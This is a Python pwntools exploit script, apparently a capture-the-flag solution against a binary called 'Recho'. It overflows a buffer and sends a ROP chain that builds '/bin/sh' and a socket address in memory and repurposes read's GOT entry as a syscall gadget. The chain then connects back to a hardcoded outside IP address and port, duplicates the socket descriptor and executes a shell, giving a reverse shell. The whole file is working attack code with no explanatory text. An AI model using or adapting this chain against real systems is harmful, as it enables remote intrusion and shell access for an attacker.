#!/usr/bin/env python
import sys, os
from pwn import *

HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 5566)
elf = ELF('Recho'); context.word_size = elf.elfclass
with context.local(log_level='ERROR'):
    libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc
if not libc: log.warning('Cannot open libc.so.6')

def make_arg(arg, addr):
    gadget = ''
    for i, c in enumerate(arg):
        gadget += flat(pop_rdi, addr + i, pop_rax, ord(c), add_rdi_al)
    return gadget

r = remote(HOST, PORT)
pause()

add_rdi_al = 0x40070d
pop_rax = 0x4006fc 
pop_rdx = 0x4006fe 
pop_rdi = 0x4008a3 
pop_rsi = 0x4008a1 # pop 2
syscall = 0x400600 
arg1 = 0x601800
arg2 = 0x601880
arg3 = 0x601900
sockaddr = 0x601800
cmd = 0x601880
tmp = 0x601980
args = 0x601c00

sockfd = 3
exp = flat(
    'a'*0x38,
    # make cmd
    make_arg('/bin/sh', cmd),
    # make sockaddr
    make_arg(p16(2) + p8(0x4) + p8(0xd2) + p8(35) + p8(187) + p8(152) + p8(20), sockaddr),
    # make read.plt => syscall
    pop_rdi, elf.got['read'], pop_rax, 14, add_rdi_al,
    # sockfd = socket(AF_INET, SOCK_STREAM, 0)
    pop_rax, 0x29, pop_rdi, 2, pop_rsi, 1, 0, pop_rdx, 0, syscall,
    # connect(sockfd, sockaddr, sizeof(sockaddr))
    pop_rax, 0x2a, pop_rdi, sockfd, pop_rsi, sockaddr, 0, pop_rdx, 0x10, syscall,
    # dup()
    pop_rax, 0x21, pop_rdi, sockfd, pop_rsi, 0, 0, syscall,
    pop_rax, 0x21, pop_rdi, sockfd, pop_rsi, 1, 0, syscall,
    # execve
    pop_rax, 0x3b, pop_rdi, cmd, pop_rsi, 0, 0, pop_rdx, 0, syscall 
)
r.send(str(len(exp)).ljust(0x10))
r.send(exp)
r.close()
